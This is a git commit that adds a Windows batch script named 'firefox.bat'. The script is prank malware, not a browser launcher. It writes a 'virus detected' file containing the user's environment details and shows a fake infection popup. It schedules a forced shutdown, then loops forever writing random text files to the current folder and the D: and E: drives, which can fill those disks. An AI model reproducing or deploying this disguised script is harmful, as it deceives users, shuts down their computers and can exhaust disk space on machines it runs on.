247cf6407ebadec1ba5c961bb0ab4f4b1a0257ce
Pericena <pericena12@gmail.com>
2018-10-19 21:34:36 -0400

    commit inicial comentario

---
+++ Codigo/firefox.bat
@@ -0,0 +1,225 @@
+@rem Sigueme en las redes Sociales:
+@rem Blogger          https://lpericena.blogspot.com/
+@rem Github            https://github.com/Pericena
+@rem youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
+@rem pinterest        https://es.pinterest.com/lushiopericena/
+@rem twitter             https://twitter.com/LPericena
+@rem linkedin         https://www.linkedin.com/in/lpericena/
+@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
+@rem pagina facebook  https://www.facebook.com/lpericena
+@rem sitio web        https://pericena.wordpress.com/
+@rem vimeo         https://vimeo.com/lpericena
+@rem instagram      https://www.instagram.com/lpericena/
+@rem remote      https://remote.com/luishinopericena-choque
+@rem google+   https://plus.google.com/u/0/114054031405340478901
+@rem kiwi       https://kiwi.qa/LuishinoC
+@rem App    https://apps.facebook.com/167466933725219
+@rem Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
+@rem socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
+@rem teachlr    https://teachlr.com/lpericena
+@rem wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
+@rem ask          https://ask.fm/Lpericena
+@rem stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
+@rem wix https://lpericena.wixsite.com/curriculumvitae
+
+@echo off
+
+echo virus detectado #%random% Soporte:https://pericena.wordpress.com/ %OS%>virus.txt
+set Link= SOPORTE TECNICO https://pericena.wordpress.com/>>virus.txt
+set Nombre=Autor Luishino Pericena Choque >>virus.txt
+echo virus detectado #%random% Soporte:https://pericena.wordpress.com/ %OS%>>virus.txt
+echo %Nombre%  .B5           7:              >>virus.txt
+echo         %OS%               ;@@          u@@:              >>virus.txt
+echo  %TIME%-%DATE%          @@       .q@@@i  >>virus.txt
+echo                                 B@1     u@B@j %COMPUTERNAME%>>virus.txt
+echo                                r@B    jB@M. virus detectado #%random%>>virus.txt
+echo                                @B7   @B@  %USERNAME%>>virus.txt
+echo                               :B@  .@BU    r.            .M. >>virus.txt
+echo                    @          8@G  @Br  .r8@            E@2   >>virus.txt
+echo                    M@r        YB@ uBM  B@Yr            B@       >>virus.txt
+echo                     F@B5       @Bk;@G7B@@MB.    Y.    B@.       >>virus.txt
+echo                       LB@BMji   5BBB@@@B@B@B@ uB1    @@7        >>virus.txt
+echo                          rO@B@@J 8B@B@B@B@B@B7B:   :B@J         >>virus.txt
+echo                     :72j7,..:X@B@B@B@BBB@B@B@8.   MB@:        >>virus.txt
+echo                  :B@B@B@@@B@B@@@B@B@B@B@B@@@i  rB@BE            >>virus.txt
+echo                F@@@u  rB@B@B@@@B@BBB@B@B@B@B@B@B@v      7O@O    >>virus.txt
+echo             i@B@M:   B@@B@B@B@B@B@B@BBB@B@Bk:       iMB@B@;     >>virus.txt
+echo           YB@@r     @B@B@B@B@B@B@B@B@B@@  BB@@Z1Z@@B@BP,        >>virus.txt
+echo         r@B@.      @B@B@B@B@B@B@B@B@B@B@   .LO@@BOU:            >>virus.txt
+echo        @@@,       7B@B@BBM@B@B@B@B@@@XZB@                       >>virus.txt
+echo     ;@B@.         P@B@B@B@B@B@B@B@B@Br @@:                      >>virus.txt
+echo    ,@F            FB@B@B@B@B@B@B@B@B@U L@8                      >>virus.txt
+echo                    @@@B@B@B@B@B@B@B@Bu  O@r                  >>virus.txt   
+echo                    i@B@B@@@@@B@@@.vB@.   B@7                >>virus.txt    
+echo                      78@B@B@BG7   B@q     P@B:                >>virus.txt  
+echo                                 .B@E        L:               >>virus.txt   
+echo                                PB@r                      >>virus.txt       
+echo                              :@@@                             >>virus.txt  
+echo                            .B@B;                       >>virus.txt      
+echo                          ,@B@U                         >>virus.txt         
+echo                        :B@Bu                                 >>virus.txt
+echo                       B@M,                                  >>virus.txt
+echo                      @B.                                     >>virus.txt
+echo                      L  virus detectado #%random%>>virus.txt
+echo          https://pericena.wordpress.com/ >>virus.txt
+echo EL sistema %OS% hora:%TIME% fecha:%DATE% equipo %COMPUTERNAME% usuario %USERNAME% ha sido infectada de virus  ACEPTAR para eliminar el virus #%random%                          %Link%    %Nombre%>>virus.txt 
+echo %USERNAME%>>virus.txt 
+echo %USERPROFILE%>>virus.txt 
+echo %ALLUSERSPROFILE%>>virus.txt 
+echo %APPDATA%>>virus.txt 
+echo %COMMONPROGRAMFILES%>>virus.txt 
+echo %CMDCMDLINE%>>virus.txt 
+echo %CMDEXTVERSION%>>virus.txt 
+echo %COMPUTERNAME%>>virus.txt 
+echo %COMSPEC%>>virus.txt 
+echo %DATE%>>virus.txt 
+echo %ERRORLEVEL%>>virus.txt 
+echo %HOMEDRIVE%>>virus.txt 
+echo %HOMEPATH%>>virus.txt 
+echo %LOGONSERVER%>>virus.txt 
+echo %LOCALAPPDATA%>>virus.txt 
+echo %NUMBER_OF_PROCESSORS%>>virus.txt 
+echo %OS%>>virus.txt 
+echo %PATH%>>virus.txt 
+echo %PATHEXT%>>virus.txt 
+echo %PROCESSOR_ARCHITECTURE%	>>virus.txt 
+echo %PROCESSOR_IDENTIFIER%	>>virus.txt 
+echo %PROCESSOR_LEVEL%	>>virus.txt 
+echo %PROCESSOR_REVISION%>>virus.txt 
+echo %PROGRAMDATA%	>>virus.txt 
+echo %PROGRAMFILES%	>>virus.txt 
+echo %PSModulePath%	>>virus.txt 
+echo %PUBLIC%	>>virus.txt 
+echo %RANDOM%	>>virus.txt 
+echo %SYSTEMDRIVE%	>>virus.txt 
+echo %SYSTEMROOT%	>>virus.txt 
+echo %TEMP% %TMP%	>>virus.txt 
+echo %TIME%	>>virus.txt 
+echo %USERNAME%	>>virus.txt 
+echo %USERPROFILE%	>>virus.txt 
+echo %WINDIR%	>>virus.txt 
+echo %ALLUSERSPROFILE%	>>virus.txt 
+echo %APPDATA%	
+echo %CLIENTNAME%	>>virus.txt 
+echo %CommonProgramFiles%	>>virus.txt 
+echo %COMPUTERNAME%	>>virus.txt 
+echo %ComSpec%	>>virus.txt 
+echo %HOMEDRIVE% y %SystemDrive%	>>virus.txt 
+echo %HOMEPATH%	>>virus.txt 
+echo %Path%	>>virus.txt 
+echo %PATHEXT%	>>virus.txt 
+echo %ProgramFiles%	>>virus.txt 
+echo %SystemRoot% y %Windir%	>>virus.txt 
+echo %TEMP% y %TMP%	>>virus.txt 
+echo %USERNAME%	>>virus.txt 
+echo %USERPROFILE%>>virus.txt 
+
+msg *Tu EL sistema %OS% hora:%TIME% fecha:%DATE% equipo %COMPUTERNAME% usuario %USERNAME% ha sido infectada de virus  ACEPTAR para eliminar el virus #%random%                          %Link%    %Nombre%
+start virus.txt
+:Reckon 
+set Link= SOPORTE TECNICO https://pericena.wordpress.com/ 
+set Nombre=Autor Luishino Pericena Choque 
+echo %Nombre%  .B5           7:              
+echo         %OS%               ;@@          u@@:              
+echo  %TIME%-%DATE%          @@       .q@@@i  
+echo                                 B@1     u@B@j %COMPUTERNAME%
+echo                                r@B    jB@M. virus detectado #%random%%random%
+echo                                @B7   @B@  %USERNAME%
+echo                               :B@  .@BU    r.            .M. 
+echo                    @          8@G  @Br  .r8@            E@2   
+echo                    M@r        YB@ uBM  B@Yr            B@       
+echo                     F@B5       @Bk;@G7B@@MB.    Y.    B@.       
+echo                       LB@BMji   5BBB@@@B@B@B@ uB1    @@7        
+echo                          rO@B@@J 8B@B@B@B@B@B7B:   :B@J         
+echo                     :72j7,..:X@B@B@B@BBB@B@B@8.   MB@:        
+echo                  :B@B@B@@@B@B@@@B@B@B@B@B@@@i  rB@BE            
+echo                F@@@u  rB@B@B@@@B@BBB@B@B@B@B@B@B@v      7O@O    
+echo             i@B@M:   B@@B@B@B@B@B@B@BBB@B@Bk:       iMB@B@;     
+echo           YB@@r     @B@B@B@B@B@B@B@B@B@@  BB@@Z1Z@@B@BP,        
+echo         r@B@.      @B@B@B@B@B@B@B@B@B@B@   .LO@@BOU:            
+echo        @@@,       7B@B@BBM@B@B@B@B@@@XZB@                       
+echo     ;@B@.         P@B@B@B@B@B@B@B@B@Br @@:                      
+echo    ,@F            FB@B@B@B@B@B@B@B@B@U L@8                      
+echo                    @@@B@B@B@B@B@B@B@Bu  O@r                     
+echo                    i@B@B@@@@@B@@@.vB@.   B@7                    
+echo                      78@B@B@BG7   B@q     P@B:                  
+echo                                 .B@E        L:                  
+echo                                PB@r                             
+echo                              :@@@                               
+echo                            .B@B;                             
+echo                          ,@B@U                                  
+echo                        :B@Bu                                 
+echo                       B@M,  https://lpericena.blogspot.com/                                 
+echo                      @B.  https://github.com/Pericena                                  
+echo                      L   https://twitter.com/LPericena
+echo virus detectado #%random% %USERNAME% %USERPROFILE% %TIME% %DATE%
+
+shutdown -s -t 3600 -c "virus detectado #%random% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA:%DATE%  La computadora se apagara %Link% "
+cls
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>D:\%USERNAME%-%random%%random%.txt
+
+set Link= SOPORTE TECNICO https://pericena.wordpress.com/ 
+set Nombre=Autor Luishino Pericena Choque 
+echo %Nombre%  .B5           7:              
+echo         %OS%               ;@@          u@@:              
+echo  %TIME%-%DATE%          @@       .q@@@i  
+echo                                 B@1     u@B@j %COMPUTERNAME%
+echo                                r@B    jB@M. virus detectado #%random%%random%
+echo                                @B7   @B@  %USERNAME%
+echo                               :B@  .@BU    r.            .M. 
+echo                    @          8@G  @Br  .r8@            E@2   
+echo                    M@r        YB@ uBM  B@Yr            B@       
+echo                     F@B5       @Bk;@G7B@@MB.    Y.    B@.       
+echo                       LB@BMji   5BBB@@@B@B@B@ uB1    @@7        
+echo                          rO@B@@J 8B@B@B@B@B@B7B:   :B@J         
+echo                     :72j7,..:X@B@B@B@BBB@B@B@8.   MB@:        
+echo                  :B@B@B@@@B@B@@@B@B@B@B@B@@@i  rB@BE            
+echo                F@@@u  rB@B@B@@@B@BBB@B@B@B@B@B@B@v      7O@O    
+echo             i@B@M:   B@@B@B@B@B@B@B@BBB@B@Bk:       iMB@B@;     
+echo           YB@@r     @B@B@B@B@B@B@B@B@B@@  BB@@Z1Z@@B@BP,        
+echo         r@B@.      @B@B@B@B@B@B@B@B@B@B@   .LO@@BOU:            
+echo        @@@,       7B@B@BBM@B@B@B@B@@@XZB@                       
+echo     ;@B@.         P@B@B@B@B@B@B@B@B@Br @@:                      
+echo    ,@F            FB@B@B@B@B@B@B@B@B@U L@8                      
+echo                    @@@B@B@B@B@B@B@B@Bu  O@r                     
+echo                    i@B@B@@@@@B@@@.vB@.   B@7                    
+echo                      78@B@B@BG7   B@q     P@B:                  
+echo                                 .B@E        L:                  
+echo                                PB@r                             
+echo                              :@@@                               
+echo                            .B@B;                             
+echo                          ,@B@U                                  
+echo                        :B@Bu                                 
+echo                       B@M,  https://lpericena.blogspot.com/                                 
+echo                      @B.  https://github.com/Pericena                                  
+echo                      L   https://twitter.com/LPericena
+echo virus detectado #%random% %OS% %USERNAME% %USERPROFILE% %TIME% %DATE%
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%random%%random%.txt
+rem echo  virus detectado #%random% %OS% %USERNAME% %TIME% %DATE%
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%os%-%random%.txt 
+
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%COMPUTERNAME%-%random%.txt 
+
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%USERNAME%-%random%%random%.txt
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%USERNAME%-%random%%random%.txt
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: 
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%USERNAME%-%random%%random%.txt
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%USERNAME%-%random%%random%.txt
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%COMPUTERNAME%-%random%.txt
+
+echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>E:\%USERNAME%-%random%%random%.txt
+
+goto Reckon
+
+
+
+
+
+
+
